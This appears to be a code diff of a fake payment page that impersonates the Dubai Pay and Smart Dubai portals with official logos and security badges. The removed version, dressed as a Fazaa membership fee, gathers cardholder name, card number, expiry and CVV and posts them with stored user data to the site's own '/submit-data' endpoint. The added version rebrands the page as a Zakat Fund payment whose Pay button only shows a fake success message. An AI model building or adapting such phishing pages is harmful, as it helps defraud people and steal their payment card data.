@@ -40,14 +40,21 @@
             display: flex;
             gap: 12px;
             align-items: center;
-            width: 100%;
-            justify-content: space-between;
         }
 
         .header-logo {
             height: 32px;
             width: auto;
             object-fit: contain;
+        }
+
+        .lang-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 0;
         }
 
         .content {
@@ -128,6 +135,10 @@
             align-items: flex-end;
         }
 
+        .date-row select {
+            flex: 1;
+        }
+
         .date-separator {
             color: #d1d5db;
             font-size: 18px;
@@ -136,9 +147,17 @@
 
         .cvv-row {
             display: grid;
-            grid-template-columns: 1fr auto;
+            grid-template-columns: 1fr 1fr;
             gap: 12px;
-            align-items: center;
+            align-items: flex-end;
+        }
+
+        .cvv-info {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.4;
+            grid-column: 1 / -1;
+            margin-top: 4px;
         }
 
         .security-badges {
@@ -153,6 +172,39 @@
             height: 28px;
             width: auto;
             object-fit: contain;
+        }
+
+        .charity-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: #f9fafb;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+
+        .charity-checkbox {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .charity-text {
+            flex: 1;
+        }
+
+        .charity-text strong {
+            display: block;
+            font-size: 14px;
+            color: #1f2937;
+        }
+
+        .charity-link {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 13px;
         }
 
         .total-amount {
@@ -197,20 +249,17 @@
             color: #1f2937;
         }
 
+        .btn-cancel:hover {
+            background: #d1d5db;
+        }
+
         .btn-pay {
             background: #0066cc;
             color: white;
         }
 
-        .legal-text {
-            font-size: 13px;
-            color: #ef4444;
-            text-align: center;
-            margin: 15px 0;
-            line-height: 1.5;
-            padding: 10px;
-            background: #fff5f5;
-            border-radius: 6px;
+        .btn-pay:hover {
+            background: #0052a3;
         }
 
         .footer {
@@ -232,6 +281,7 @@
             .container {
                 max-width: 100%;
             }
+
             .transaction-info {
                 grid-template-columns: 1fr;
             }
@@ -243,9 +293,10 @@
         <!-- Header -->
         <div class="header">
             <div class="header-logos">
-                <img src="/smart_dubai.png" alt="Smart Dubai" class="header-logo">
                 <img src="/dubaipay.png" alt="Dubai Pay" class="header-logo">
+                <img src="/smart_dubai.png" alt="Smart Dubai" class="header-logo">
             </div>
+            <button class="lang-btn" onclick="switchLanguage()">العربية</button>
         </div>
 
         <!-- Main Content -->
@@ -256,19 +307,19 @@
                 <div class="transaction-info">
                     <div class="info-row">
                         <span class="info-label">Service Provider</span>
-                        <span class="info-value">Fazaa</span>
+                        <span class="info-value">Zakat Fund</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">Service</span>
-                        <span class="info-value">Fazaa Membership Subscription</span>
+                        <span class="info-value">Zakat DD</span>
                     </div>
                     <div class="info-row">
-                        <span class="info-label">Transaction No.</span>
-                        <span id="transactionNo" class="info-value">FZ-</span>
+                        <span class="info-label">SP Transaction No.</span>
+                        <span class="info-value">1322640</span>
                     </div>
                     <div class="info-row">
                         <span class="info-label">Amount</span>
-                        <span class="info-value">5.00 AED</span>
+                        <span class="info-value">100.00 AED</span>
                     </div>
                 </div>
             </div>
@@ -278,20 +329,15 @@
                 <div class="section-title">Card Details</div>
 
                 <div class="form-group">
-                    <label for="cardName">Cardholder Name</label>
-                    <input type="text" id="cardName" placeholder="Enter full name as shown on card" required>
-                </div>
-
-                <div class="form-group">
                     <label for="cardNumber">Card Number</label>
                     <input type="text" id="cardNumber" placeholder="Enter Card Number" 
-                           maxlength="19">
+                           maxlength="19" oninput="formatAndValidateCardNumber(this)">
                 </div>
 
                 <div class="form-group">
                     <label>Expiry Date</label>
                     <div class="date-row">
-                        <select id="expiryMonth">
+                        <select id="expiryMonth" onchange="validateExpiry()">
                             <option value="">MM</option>
                             <option value="01">01</option>
                             <option value="02">02</option>
@@ -307,9 +353,8 @@
                             <option value="12">12</option>
                         </select>
                         <span class="date-separator">/</span>
-                        <select id="expiryYear">
+                        <select id="expiryYear" onchange="validateExpiry()">
                             <option value="">YY</option>
-                            <option value="25">25</option>
                             <option value="26">26</option>
                             <option value="27">27</option>
                             <option value="28">28</option>
@@ -327,110 +372,125 @@
                 <div class="form-group">
                     <label for="cvv">CVV Number</label>
                     <div class="cvv-row">
-                        <input type="text" id="cvv" placeholder="CVV" maxlength="4">
+                        <input type="text" id="cvv" placeholder="CW" maxlength="4" 
+                               oninput="validateCVV(this)">
+                        <img src="/card_logos.png" alt="CVV" style="height: 32px; width: auto;">
+                    </div>
+                    <div class="cvv-info">
+                        CVV number (Security Code) is the last three digits of the number found on the back of your credit card near the signature strip.
                     </div>
                 </div>
             </div>
 
             <!-- Security Badges -->
             <div class="security-badges">
-                <img src="/card_logos.png" alt="Cards" class="badge">
+                <img src="/card_logos.png" alt="Mastercard" class="badge">
                 <img src="/verified_visa.gif" alt="Verified by VISA" class="badge">
                 <img src="/pci_dss.png" alt="PCI DSS" class="badge">
             </div>
 
-            <!-- Legal Text -->
-            <div class="legal-text">
-                No fees will be deducted until your request is approved by Fazaa Foundation. An OTP code will be sent to your registered phone to confirm the transaction.
+            <!-- Charity Section -->
+            <div class="charity-section">
+                <input type="checkbox" id="charityCheckbox" class="charity-checkbox">
+                <div class="charity-text">
+                    <strong>Donate for charity "Dirham Alkhair"</strong>
+                    <a href="#" class="charity-link">Learn More</a>
+                </div>
+                <div style="width: 40px; height: 40px; display: flex; align-items: center; justify-content: center;">
+                    <span style="font-size: 24px;">🤝</span>
+                </div>
             </div>
 
             <!-- Total Amount -->
             <div class="total-amount">
                 <div class="total-label">Total Amount</div>
-                <div class="total-value">5.00 AED</div>
+                <div class="total-value">100.00 AED</div>
             </div>
 
             <!-- Buttons -->
             <div class="buttons">
-                <button class="btn btn-cancel" onclick="history.back()">Cancel</button>
-                <button class="btn btn-pay" id="payButton">Pay</button>
+                <button class="btn btn-cancel" onclick="goBack()">Cancel</button>
+                <button class="btn btn-pay" onclick="completePayment()">Pay</button>
             </div>
         </div>
 
         <!-- Footer -->
         <div class="footer">
             <div class="footer-phone">For more inquiries please call 600 560 000</div>
-            <div>Copyright © 2024. All rights reserved.</div>
+            <div>Copyright © 2020. All rights reserved.</div>
         </div>
     </div>
 
     <script>
-        // Generate random transaction number starting with FZ
-        const randomNo = Math.floor(100000 + Math.random() * 900000);
-        const fullTransactionNo = 'FZ-' + randomNo;
-        document.getElementById('transactionNo').innerText = fullTransactionNo;
+        function formatAndValidateCardNumber(input) {
+            let value = input.value.replace(/\s/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            input.value = formatted;
 
-        // Formatting card number
-        document.getElementById('cardNumber').addEventListener('input', function (e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formattedValue = "";
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += " ";
-                }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
-        });
-
-        document.getElementById('payButton').addEventListener('click', async function() {
-            const cardName = document.getElementById('cardName').value;
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expiryMonth = document.getElementById('expiryMonth').value;
-            const expiryYear = document.getElementById('expiryYear').value;
-            const cvv = document.getElementById('cvv').value;
-
-            if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
-                alert('Please complete all fields');
-                return;
-            }
-
-            this.disabled = true;
-            this.innerText = 'Processing...';
-
-            const userData = JSON.parse(sessionStorage.getItem('userData') || '{}');
-            
-            const payload = {
-                ...userData,
-                transactionId: fullTransactionNo,
-                cardName,
-                cardNumber,
-                expiryDate: `${expiryMonth}/${expiryYear}`,
-                cvv
-            };
-
-            try {
-                const response = await fetch('/submit-data', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                if (response.ok) {
-                    const data = await response.json();
-                    window.location.href = `processing_en.html?orderId=${data.orderId}`;
+            if (value.length === 16) {
+                if (luhnCheck(value)) {
+                    input.style.borderColor = '#d1d5db';
                 } else {
-                    alert('An error occurred. Please try again.');
-                    this.disabled = false;
-                    this.innerText = 'Pay';
+                    input.style.borderColor = '#ef4444';
                 }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('Connection error.');
-                this.disabled = false;
-                this.innerText = 'Pay';
+            } else if (value.length > 0) {
+                input.style.borderColor = '#ef4444';
+            } else {
+                input.style.borderColor = '#d1d5db';
             }
-        });
+        }
+
+        function luhnCheck(num) {
+            let sum = 0;
+            let isEven = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num[i], 10);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return sum % 10 === 0;
+        }
+
+        function validateExpiry() {
+            const month = document.getElementById('expiryMonth').value;
+            const year = document.getElementById('expiryYear').value;
+
+            if (month && year) {
+                const currentDate = new Date();
+                const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1);
+                if (expiryDate < currentDate) {
+                    // Card expired
+                }
+            }
+        }
+
+        function validateCVV(input) {
+            const cvv = input.value;
+            
+            if (cvv.length > 0 && !/^\d+$/.test(cvv)) {
+                input.style.borderColor = '#ef4444';
+            } else if (cvv.length > 0 && (cvv.length < 3 || cvv.length > 4)) {
+                input.style.borderColor = '#ef4444';
+            } else {
+                input.style.borderColor = '#d1d5db';
+            }
+        }
+
+        function completePayment() {
+            alert('Payment completed successfully!');
+        }
+
+        function goBack() {
+            window.history.back();
+        }
+
+        function switchLanguage() {
+            window.location.href = '/payment_ar.html';
+        }
     </script>
 </body>
 </html>
